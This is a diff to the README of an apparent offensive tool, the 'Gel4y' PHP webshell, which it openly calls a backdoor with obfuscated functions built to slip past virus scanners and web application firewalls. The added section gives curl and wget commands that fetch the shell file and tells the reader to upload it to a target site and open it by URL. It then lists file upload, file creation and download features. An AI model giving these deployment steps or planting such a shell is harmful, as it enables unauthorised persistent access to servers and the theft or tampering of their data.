@@ -12,10 +12,21 @@ Summary
 ----------
 
 Gel4y Webshell is a backdoor that was built using the PHP programming language with the PHP procedural method in stealth mode where the file size is only <20KB, using the [nano shell](https://github.com/22XploiterCrew-Team/Shellmon) method so it easily escapes virus scanning. Every PHP function has been obfuscated to avoid some firewall systems (WAF) blocking some PHP functions that are considered dangerous.
+### How To Use
+You only need to download the files in this repo, there are several easy ways that you might try
+* cURL
+  ```curl https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php -o gel4y.php```
+* wget
+  ```wget https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php```
 
-Features
+the method above will download and save to your computer, you only need to upload the webshell to the target site that you have and call it according to the name of the webshell file you downloaded.
+
+ex: ***https://server.com/gel4y.php***.
+
+Features [UPDATED]
 --------
 
+* ***Obfuscated Code (not a feature in webshell)***
 * Multiple File Upload
 * Create Folder and File
 * File Download
